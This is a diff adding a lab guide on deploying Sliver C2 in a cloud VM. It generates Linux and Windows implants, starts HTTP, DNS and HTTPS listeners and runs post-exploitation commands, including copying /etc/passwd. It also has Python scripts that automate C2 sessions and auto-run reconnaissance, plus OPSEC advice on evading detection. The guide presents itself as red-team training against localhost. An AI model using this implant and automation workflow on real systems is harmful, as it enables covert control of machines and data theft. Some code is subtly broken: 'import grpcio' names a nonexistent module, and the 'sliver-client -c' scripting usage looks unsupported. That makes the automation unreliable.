@@ -1,0 +1,478 @@
+Deploy Sliver C2 in a Cloud VM
+Objectives
+By the end of this lab, students will be able to:
+
+Deploy and configure Sliver C2 server in a cloud Linux environment
+Generate and manage Sliver implants for target systems
+Establish command and control sessions with compromised machines
+Execute post-exploitation commands through Sliver C2
+Automate Sliver C2 interactions using Python scripts
+Understand the architecture and capabilities of modern C2 frameworks
+Implement operational security practices for C2 deployment
+Prerequisites
+Before starting this lab, students should have:
+
+Basic understanding of Linux command line operations
+Familiarity with networking concepts (TCP/IP, ports, protocols)
+Knowledge of penetration testing methodologies
+Understanding of command and control concepts
+Basic Python programming skills
+Experience with terminal-based tools
+Lab Environment
+Al Nafi provides ready-to-use Linux-based cloud machines for this lab. Simply click Start Lab to access your pre-configured environment. No additional VM setup is required.
+
+Your lab machine includes:
+
+Ubuntu 22.04 LTS with administrative privileges
+Pre-installed development tools and dependencies
+Network connectivity for downloading required tools
+Python 3.x environment with pip package manager
+Task 1: Set up Sliver C2 in a Cloud Environment
+Subtask 1.1: Download and Install Sliver C2
+First, we need to download and install the Sliver C2 framework on our Linux machine.
+
+Update the system packages:
+sudo apt update && sudo apt upgrade -y
+Install required dependencies:
+sudo apt install -y curl wget git build-essential python3 python3-pip
+Download the latest Sliver release:
+cd /opt
+sudo mkdir sliver
+cd sliver
+sudo wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -O sliver-server
+sudo wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux -O sliver-client
+Make the binaries executable:
+sudo chmod +x sliver-server sliver-client
+Create symbolic links for easier access:
+sudo ln -s /opt/sliver/sliver-server /usr/local/bin/sliver-server
+sudo ln -s /opt/sliver/sliver-client /usr/local/bin/sliver-client
+Subtask 1.2: Initialize Sliver Server
+Start the Sliver server for the first time:
+sudo sliver-server
+The server will generate certificates and configuration files. Wait for the initialization to complete.
+
+Create a new operator (user) for the Sliver server:
+
+When prompted, create an operator account:
+
+Username: redteam
+Password: SecurePass123!
+Stop the server using Ctrl+C and restart it in daemon mode:
+sudo sliver-server daemon
+Subtask 1.3: Configure Sliver Client Connection
+Start the Sliver client:
+sliver-client
+Connect to the local server:
+connect
+Verify the connection by checking server status:
+info
+You should see server information including version, operators, and active sessions.
+
+Task 2: Use Sliver to Interact with Compromised Machines
+Subtask 2.1: Generate Sliver Implants
+Generate a basic HTTP implant:
+generate --http localhost:8080 --os linux --arch amd64 --format executable --save /tmp/
+Generate a DNS implant for stealth operations:
+generate --dns localhost --os linux --arch amd64 --format executable --save /tmp/ --name dns-implant
+Generate a Windows executable for cross-platform testing:
+generate --http localhost:8080 --os windows --arch amd64 --format executable --save /tmp/ --name windows-implant
+List all generated implants:
+implants
+Subtask 2.2: Start HTTP Listener
+Start an HTTP listener on port 8080:
+http --lport 8080
+Verify the listener is active:
+jobs
+Check listener details:
+info
+Subtask 2.3: Simulate Implant Execution
+Since we're working on a single machine, we'll simulate a compromised target by executing our own implant.
+
+Open a new terminal window (keep Sliver client running in the first):
+# In the new terminal
+cd /tmp
+chmod +x *_linux
+Execute the implant (this simulates a compromised machine):
+./[implant-name]_linux &
+Return to the Sliver client terminal and check for new sessions:
+sessions
+Interact with the new session:
+use [session-id]
+Subtask 2.4: Post-Exploitation Commands
+Gather system information:
+info
+getuid
+getpid
+pwd
+Perform file system operations:
+ls
+cd /home
+ls -la
+Execute system commands:
+shell whoami
+shell uname -a
+shell ps aux | head -10
+Download a file from the target:
+download /etc/passwd /tmp/passwd-copy
+Upload a file to the target:
+# First, create a test file in another terminal
+echo "Test file from C2" > /tmp/test-upload.txt
+upload /tmp/test-upload.txt /tmp/uploaded-file.txt
+Task 3: Automate Sliver C2 Interactions using Python
+Subtask 3.1: Install Python Dependencies
+Install required Python packages:
+pip3 install requests grpcio grpcio-tools protobuf
+Create a working directory for Python scripts:
+mkdir -p /opt/sliver-automation
+cd /opt/sliver-automation
+Subtask 3.2: Create Sliver Python Client
+Create a Python script for basic Sliver automation:
+nano sliver_automation.py
+Add the following Python code:
+#!/usr/bin/env python3
+
+import subprocess
+import json
+import time
+import sys
+import os
+
+class SliverAutomation:
+    def __init__(self):
+        self.sliver_client = "sliver-client"
+        
+    def execute_sliver_command(self, command):
+        """Execute a command in Sliver and return the output"""
+        try:
+            # Create a temporary script file
+            script_content = f"""
+connect
+{command}
+exit
+"""
+            with open('/tmp/sliver_script.txt', 'w') as f:
+                f.write(script_content)
+            
+            # Execute the script
+            result = subprocess.run([self.sliver_client, '-c', '/tmp/sliver_script.txt'], 
+                                  capture_output=True, text=True, timeout=30)
+            
+            # Clean up
+            os.remove('/tmp/sliver_script.txt')
+            
+            return result.stdout, result.stderr
+            
+        except Exception as e:
+            return None, str(e)
+    
+    def list_sessions(self):
+        """List all active sessions"""
+        print("[+] Listing active sessions...")
+        stdout, stderr = self.execute_sliver_command("sessions")
+        if stdout:
+            print(stdout)
+        if stderr:
+            print(f"Error: {stderr}")
+    
+    def generate_implant(self, os_type="linux", arch="amd64", listener_type="http", port=8080):
+        """Generate a new implant"""
+        print(f"[+] Generating {os_type} implant...")
+        command = f"generate --{listener_type} localhost:{port} --os {os_type} --arch {arch} --format executable --save /tmp/"
+        stdout, stderr = self.execute_sliver_command(command)
+        if stdout:
+            print(stdout)
+        if stderr:
+            print(f"Error: {stderr}")
+    
+    def start_listener(self, listener_type="http", port=8080):
+        """Start a listener"""
+        print(f"[+] Starting {listener_type} listener on port {port}...")
+        command = f"{listener_type} --lport {port}"
+        stdout, stderr = self.execute_sliver_command(command)
+        if stdout:
+            print(stdout)
+        if stderr:
+            print(f"Error: {stderr}")
+    
+    def execute_on_session(self, session_id, command):
+        """Execute a command on a specific session"""
+        print(f"[+] Executing '{command}' on session {session_id}...")
+        sliver_command = f"use {session_id}\n{command}"
+        stdout, stderr = self.execute_sliver_command(sliver_command)
+        if stdout:
+            print(stdout)
+        if stderr:
+            print(f"Error: {stderr}")
+
+def main():
+    automation = SliverAutomation()
+    
+    print("=== Sliver C2 Automation Script ===")
+    print("1. List Sessions")
+    print("2. Generate Implant")
+    print("3. Start HTTP Listener")
+    print("4. Execute Command on Session")
+    print("5. Exit")
+    
+    while True:
+        choice = input("\nEnter your choice (1-5): ").strip()
+        
+        if choice == "1":
+            automation.list_sessions()
+            
+        elif choice == "2":
+            os_type = input("Enter OS type (linux/windows) [linux]: ").strip() or "linux"
+            automation.generate_implant(os_type=os_type)
+            
+        elif choice == "3":
+            port = input("Enter port number [8080]: ").strip() or "8080"
+            automation.start_listener(port=int(port))
+            
+        elif choice == "4":
+            session_id = input("Enter session ID: ").strip()
+            command = input("Enter command to execute: ").strip()
+            if session_id and command:
+                automation.execute_on_session(session_id, command)
+            else:
+                print("Session ID and command are required!")
+                
+        elif choice == "5":
+            print("Exiting...")
+            break
+            
+        else:
+            print("Invalid choice! Please enter 1-5.")
+
+if __name__ == "__main__":
+    main()
+Make the script executable:
+chmod +x sliver_automation.py
+Subtask 3.3: Create Advanced Automation Scripts
+Create a session monitoring script:
+nano session_monitor.py
+Add the following code:
+#!/usr/bin/env python3
+
+import subprocess
+import time
+import json
+import re
+
+class SliverMonitor:
+    def __init__(self, check_interval=30):
+        self.check_interval = check_interval
+        self.known_sessions = set()
+        
+    def get_sessions(self):
+        """Get current active sessions"""
+        try:
+            result = subprocess.run(['sliver-client', '-c', 'connect\nsessions\nexit'], 
+                                  capture_output=True, text=True, timeout=10)
+            return result.stdout
+        except:
+            return ""
+    
+    def parse_sessions(self, output):
+        """Parse session information from Sliver output"""
+        sessions = []
+        lines = output.split('\n')
+        for line in lines:
+            if 'Session' in line and 'ID' in line:
+                # Extract session ID using regex
+                match = re.search(r'([a-f0-9-]{36})', line)
+                if match:
+                    sessions.append(match.group(1))
+        return sessions
+    
+    def monitor_sessions(self):
+        """Continuously monitor for new sessions"""
+        print("[+] Starting session monitor...")
+        print(f"[+] Checking every {self.check_interval} seconds")
+        
+        while True:
+            try:
+                output = self.get_sessions()
+                current_sessions = set(self.parse_sessions(output))
+                
+                # Check for new sessions
+                new_sessions = current_sessions - self.known_sessions
+                if new_sessions:
+                    print(f"\n[!] New session(s) detected: {new_sessions}")
+                    for session in new_sessions:
+                        self.handle_new_session(session)
+                
+                # Check for lost sessions
+                lost_sessions = self.known_sessions - current_sessions
+                if lost_sessions:
+                    print(f"\n[!] Lost session(s): {lost_sessions}")
+                
+                self.known_sessions = current_sessions
+                print(f"[*] Active sessions: {len(current_sessions)}")
+                
+                time.sleep(self.check_interval)
+                
+            except KeyboardInterrupt:
+                print("\n[+] Monitor stopped by user")
+                break
+            except Exception as e:
+                print(f"[!] Error: {e}")
+                time.sleep(5)
+    
+    def handle_new_session(self, session_id):
+        """Handle new session detection"""
+        print(f"[+] Handling new session: {session_id}")
+        
+        # Auto-execute basic reconnaissance
+        commands = [
+            "info",
+            "getuid",
+            "pwd",
+            "shell uname -a"
+        ]
+        
+        for cmd in commands:
+            try:
+                script_content = f"connect\nuse {session_id}\n{cmd}\nexit"
+                with open('/tmp/auto_recon.txt', 'w') as f:
+                    f.write(script_content)
+                
+                result = subprocess.run(['sliver-client', '-c', '/tmp/auto_recon.txt'], 
+                                      capture_output=True, text=True, timeout=15)
+                print(f"[+] {cmd}: {result.stdout.strip()}")
+                
+            except Exception as e:
+                print(f"[!] Error executing {cmd}: {e}")
+
+if __name__ == "__main__":
+    monitor = SliverMonitor(check_interval=10)
+    monitor.monitor_sessions()
+Make the monitoring script executable:
+chmod +x session_monitor.py
+Subtask 3.4: Test Python Automation
+Run the main automation script:
+python3 sliver_automation.py
+Test different functions:
+
+List sessions (option 1)
+Generate a new implant (option 2)
+Start a listener (option 3)
+In a separate terminal, start the session monitor:
+
+cd /opt/sliver-automation
+python3 session_monitor.py
+Execute a new implant to test the monitor:
+# In another terminal
+cd /tmp
+./[new-implant-name] &
+The monitor should detect the new session and automatically perform reconnaissance.
+
+Advanced Configuration and Security
+Subtask 4.1: Configure HTTPS Listeners
+Generate SSL certificates for HTTPS communication:
+# In Sliver client
+https --lport 8443 --cert /opt/sliver/server.crt --key /opt/sliver/server.key
+Generate HTTPS implant:
+generate --https localhost:8443 --os linux --arch amd64 --format executable --save /tmp/ --name https-implant
+Subtask 4.2: Implement Operational Security
+Create a configuration file for operational parameters:
+nano /opt/sliver-automation/opsec_config.json
+Add the following configuration:
+{
+    "listeners": {
+        "http": {
+            "port": 8080,
+            "enabled": true
+        },
+        "https": {
+            "port": 8443,
+            "enabled": true
+        },
+        "dns": {
+            "domain": "localhost",
+            "enabled": false
+        }
+    },
+    "implants": {
+        "default_os": "linux",
+        "default_arch": "amd64",
+        "beacon_interval": 60,
+        "jitter": 30
+    },
+    "automation": {
+        "auto_recon": true,
+        "session_timeout": 3600,
+        "max_sessions": 10
+    }
+}
+Troubleshooting Common Issues
+Issue 1: Sliver Server Won't Start
+Solution:
+
+# Check if port is already in use
+sudo netstat -tlnp | grep :31337
+
+# Kill existing processes
+sudo pkill sliver-server
+
+# Restart with verbose logging
+sudo sliver-server --debug
+Issue 2: Implant Won't Connect
+Solution:
+
+# Check firewall settings
+sudo ufw status
+
+# Verify listener is active
+# In Sliver client: jobs
+
+# Check network connectivity
+curl -I http://localhost:8080
+Issue 3: Python Scripts Fail
+Solution:
+
+# Verify Python dependencies
+pip3 list | grep grpcio
+
+# Check Sliver client path
+which sliver-client
+
+# Test manual connection
+sliver-client -c "connect\ninfo\nexit"
+Lab Verification
+Verification Checklist
+Sliver Server Status:
+sudo systemctl status sliver-server 2>/dev/null || echo "Running in daemon mode"
+Active Listeners:
+# In Sliver client
+jobs
+Generated Implants:
+ls -la /tmp/*_linux /tmp/*_windows 2>/dev/null
+Python Scripts:
+python3 -c "import grpcio; print('gRPC available')"
+ls -la /opt/sliver-automation/*.py
+Active Sessions:
+# In Sliver client
+sessions
+Conclusion
+In this comprehensive lab, you have successfully:
+
+Deployed Sliver C2 Framework: Set up a complete command and control infrastructure in a cloud environment
+Generated Multiple Implants: Created various implant types for different operating systems and communication methods
+Established C2 Communications: Successfully connected implants to the server and maintained persistent sessions
+Performed Post-Exploitation: Executed reconnaissance and file operations on compromised systems
+Automated C2 Operations: Developed Python scripts to automate routine C2 tasks and monitoring
+Implemented Security Measures: Configured HTTPS listeners and operational security practices
+This lab demonstrates the power and flexibility of modern C2 frameworks like Sliver. Understanding these tools is crucial for red team operations and helps blue teams better defend against sophisticated adversaries. The automation capabilities you've developed will significantly enhance operational efficiency during penetration testing engagements.
+
+Key Takeaways:
+
+Sliver provides a robust, open-source alternative to commercial C2 frameworks
+Automation is essential for managing multiple sessions and maintaining operational tempo
+Proper OPSEC and configuration are critical for avoiding detection
+Python integration allows for custom tooling and advanced automation scenarios
+Next Steps:
+
+Explore Sliver's advanced features like pivoting and lateral movement
+Integrate Sliver with other red team tools and frameworks
+Develop custom modules and extensions for specific engagement requirements
+Practice defensive techniques to detect and mitigate C2 communications
